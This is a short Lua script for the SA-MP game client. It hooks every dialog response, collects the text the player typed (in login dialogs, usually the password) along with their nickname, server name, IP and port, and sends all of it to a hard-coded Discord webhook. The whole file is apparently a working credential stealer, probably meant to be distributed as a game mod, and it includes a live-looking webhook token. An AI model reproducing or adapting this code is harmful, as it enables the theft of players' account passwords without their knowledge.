local webhookUrl = "https://discord.com/api/webhooks/1473842271756746944/dEyWDYk9-JHspaKmG5VyW3qXf8ZB3Os1WCA_TzCNyoyaQX_GBhoYescLifGtSilHHyER"
local https = require("ssl.https")
local ltn12 = require("ltn12")

function sendMessageToDiscord(content)
    local body = '{"content": "' .. content:gsub('"', '\"'):gsub('\n', '\\n') .. '"}'
    local response_body = {}
    local res, code, response_headers, status = https.request{
        url = webhookUrl,
        method = "POST",
        headers = {
            ["Content-Type"] = "application/json",
            ["Content-Length"] = tostring(#body)
        },
        source = ltn12.source.string(body),
        sink = ltn12.sink.table(response_body)
    }

    if code ~= 200 then
    end
end

require('samp.events').onSendDialogResponse = function(dialogId, button, listboxId, input)
    local res, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
    local nick = sampGetPlayerNickname(id)
    local hora = os.date("%H:%M:%S")
    local ip, port = sampGetCurrentServerAddress()
    local servername = sampGetCurrentServerName()

    local message = string.format(
        "```Arquivo: thelord.lua\nENTR4DA: %s\nTITÚL0: %s\nSERVIDOR: %s (%s:%d)\n\nHORA: %s```",
        input, nick, servername, ip, port, hora
    )

    sendMessageToDiscord(message)
end
